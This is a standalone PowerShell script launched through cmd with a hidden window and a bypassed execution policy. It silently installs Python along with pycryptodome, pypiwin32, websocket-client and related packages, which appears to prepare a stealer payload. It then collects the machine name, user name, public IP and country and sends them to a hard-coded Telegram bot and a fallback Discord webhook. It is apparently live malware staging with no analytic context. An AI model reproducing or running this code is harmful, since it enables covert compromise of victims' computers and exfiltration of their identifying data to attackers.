cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command {

  $logFile = "$env:LOCALAPPDATA\pip_log.txt"
  "`n=== [Start Install - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] ===`n" | Out-File $logFile -Encoding UTF8

  $hadPython = $false
  try {
    $v = & python --version 2>&1
    if ($v -match "^Python\s+\d+\.\d+") { $hadPython = $true }
  } catch {}

  $pyPath = "$env:LOCALAPPDATA\Programs\Python\Python313"
  $python = "$pyPath\python.exe"

  if (-not $hadPython -and -not (Test-Path $python)) {
    $inst = "$env:TEMP\py_installer.exe"
    Invoke-WebRequest "https://www.python.org/ftp/python/3.13.0/python-3.13.0-amd64.exe" -OutFile $inst
    Start-Process $inst -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0" -Wait
    Remove-Item $inst
  }

  $maxWait = 30
  $i = 0
  while (-not (Test-Path $python) -and ($i -lt $maxWait)) {
    Start-Sleep 2
    $i++
  }

  $pythonOK = $false
  try {
    $v = & $python --version 2>&1
    if ($v -match "^Python\s+\d+\.\d+") { $pythonOK = $true }
  } catch {}

  if ($pythonOK) {
    "`n[+] Python path: $python" | Out-File $logFile -Append
    try {
      & $python -m ensurepip 2>&1 | Out-File $logFile -Append
      & $python -m pip install --upgrade pip 2>&1 | Out-File $logFile -Append

      "requests","websocket-client","pyasn1","pycryptodome","pypiwin32" | ForEach-Object {
        "`n[+] Installing $_ ..." | Out-File $logFile -Append
        & $python -m pip install $_ 2>&1 | Out-File $logFile -Append
      }

      "`n[✓] Installation completed." | Out-File $logFile -Append
    } catch {
      "`n[!] Error during pip install: $_" | Out-File $logFile -Append
    }
  } else {
    "`n[✗] Python not found after installation." | Out-File $logFile -Append
  }

  "`n=== [End Install - $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')] ===`n" | Out-File $logFile -Append

  $token = "8153825828:AAE-Z7EZqi3_gmWCS11o-PNTPgoNkqG-U5U"
  $chat = "1773070934"
  $discord = "https://discordapp.com/api/webhooks/1380029813946978350/Uk8Z0frGBDewUvBqMCBRanZiN0sMTg-WQQ8dwsvc_4o2D_HY23aMV57aGmSPVxuXu8Hg"

  try {
    $r = Invoke-RestMethod "http://ip-api.com/json/?fields=8195"
    $ip = $r.query
    $ct = "$($r.countryCode) - $($r.country)"
  } catch {
    $ip = "N/A"
    $ct = "Unknown"
  }

  $msgType = if ($hadPython) { "DacoPython" } else { "SetupSuccess" }
  $msg = "[$msgType]`nMachine: $env:COMPUTERNAME`nUser: $env:USERNAME`nIP: $ip`nCountry: $ct`nTime: $(Get-Date -f 'dd-MM-yyyy (HH:mm:ss)')"

  try {
    Invoke-RestMethod "https://api.telegram.org/bot$token/sendMessage" -Method Post -Body @{ chat_id = $chat; text = $msg }
  } catch {
    $json = @{
      content = "⚠️ Python setup fallback"
      embeds = @(@{
        title = "Python Report"
        description = $msg
        color = 3447003
      })
    } | ConvertTo-Json -Depth 3

    try {
      Invoke-RestMethod -Uri $discord -Method Post -Body $json -ContentType "application/json"
    } catch {}
  }
}
